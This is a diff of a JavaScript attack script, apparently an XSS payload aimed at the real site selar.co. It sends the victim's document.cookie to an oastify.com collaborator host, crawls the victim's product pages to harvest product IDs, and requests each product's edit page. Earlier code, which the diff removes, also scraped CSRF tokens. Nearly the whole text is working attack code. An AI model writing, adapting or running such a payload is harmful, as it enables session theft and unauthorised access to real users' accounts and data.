@@ -3,23 +3,30 @@ fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`,
 let urls = ['not empty'];
 let token = 0;
 let index=0;
+let b = [];
 while (urls != []) {
+console.log(index)
   index += 1;
   fetch(`https://selar.co/me/products?domain=selar.co&requires_product_url=1&page=${index}`)
   .then(response => response.text())
   .then(html => {
-    console.log(html);const str  = html;
-    const match_ = str.match(/name="csrf_token"\s+content="([^"]+)"/);
-    token = match_[1];
+    //console.log(html);
+const str  = html;
 const match = str.match(/selar.co\\\/[a-zA-Z0-9]+/);
 const matches = [...str.matchAll(/selar.co\\\/[a-zA-Z0-9]+/g)];
 urls = matches.filter(match => match[0].split('/')[1].length === 6).map(match => match[0].split('/')[1]);
-console.log(urls); 
+if (urls != []) {
+for (let i=0; i<urls.length; i++) {b.push(urls[i])}
+}
+console.log(urls,index); 
   })
   .catch(error => console.error('Error fetching the HTML:', error));
+if (index >6) {break}
+}
+
 let xhr = new XMLHttpRequest();
-for (let i=0; i<urls.length; i++) {
-  xhr.open('GET', `https://selar.co/me/products/${urls[i]}/edit`, true);
+for (let x=0; x<b.length; x++) {
+  xhr.open('GET', `https://selar.co/me/products/${b[x]}/edit`, true);
   xhr.setRequestHeader('Accept', 'text/html, application/xhtml+xml');
   xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
   xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
@@ -114,6 +121,4 @@ for (let i=0; i<urls.length; i++) {
     console.error('There was a problem with the request.');
   };
   xhr.send();
-}
-
 }
